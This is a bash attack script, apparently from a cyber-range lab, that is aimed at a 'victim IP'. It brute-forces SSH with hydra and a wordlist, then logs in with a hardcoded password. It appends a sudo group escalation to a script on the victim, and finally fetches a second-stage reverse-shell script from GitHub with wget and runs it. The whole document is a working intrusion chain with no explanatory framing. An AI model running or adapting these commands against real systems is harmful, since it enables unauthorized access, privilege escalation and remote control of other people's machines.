#!/bin/bash
#Install sshpass for attack
sudo apt-get update
sudo apt-get install -y sshpass

#Get attacker ip
read -p "What is the attacker IP:" attacker_ip

#Get victim ip
read -p "What is the victim IP:" victim_ip

#Brute Force SSH for user1
hydra -l user1 -P /usr/share/wordlists/john.lst -t 6 ssh://$victim_ip
sudo sshpass -p "password1" ssh -o StrictHostKeyChecking=no "user1@${victim_ip}" 'echo "sudo usermod -aG sudo user1" >> /usr/local/bin/Hello.sh'

#Wait 6 seconds for user to be created
sleep 6

#Create python rev shell file
sudo sshpass -p "password1" ssh -o StrictHostKeyChecking=no "user1@${victim_ip}" 'wget "https://raw.githubusercontent.com/acebird/CyberforceLabs/refs/heads/main/Lab1attack_part2.sh"; sudo chmod +x Lab1attack_part2.sh; sudo ./Lab1attack_part2.sh'

